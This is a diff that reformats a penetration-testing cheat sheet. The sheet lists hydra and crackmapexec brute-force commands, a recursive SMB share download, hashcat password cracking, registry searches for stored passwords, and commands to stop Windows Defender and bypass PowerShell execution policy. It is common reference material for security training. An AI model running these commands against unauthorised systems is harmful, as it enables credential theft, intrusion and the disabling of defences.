@@ -21,16 +21,22 @@
 > hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
 
 **Downloading file**
-> ftp <IP>
+> ftp {IP}
+
 > PASSIVE
-> BINARY
-> get <FILE>
+
+  > BINARY
+
+> get {FILE}
 
 **Uploading file**
-> ftp <IP>
+> ftp {IP}
+
 > PASSIVE
+
 > BINARY
-> put <FILE>
+
+> put {FILE}
 
 
 # SSH - 22
@@ -173,7 +179,7 @@ Tomcat6 :
 > smbclient //<IP>/<SHARE>
 
 # Download all files from a directory recursively
-smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
+> smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
 
 **Brute force**
 > crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
@@ -250,11 +256,11 @@ hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
 
 **Connect**
 
-# Local **
+> # Local
 > mysql -u <USER>
 > mysql -u <USER> -p
 
-# Remote **
+> # Remote
 > mysql -h <IP> -u <USER>
 
 ## RDP - 3389
@@ -356,7 +362,7 @@ hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
 
   - https://hashes.com/en/decrypt/hash
 
-**Hashcat*8
+**Hashcat**
 
 **Linux password**
 > hashcat -m 1800 -a 0 hash.txt rockyou.txt
@@ -413,16 +419,16 @@ hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
 > reg query HKLM /f password /t REG_SZ /s
 > reg query HKCU /f password /t REG_SZ /s
 
-# Disable windows defender **
+**Disable windows defender**
 > sc stop WinDefend
 
-# Bypass restriction **
+**Bypass restriction**
 > powershell -nop -ep bypass
 
-# List hidden files **
+**List hidden files**
 > dir /a
 
-# Find a file**
+**Find a file**
 > dir /b/s "<FILE>"
 
 
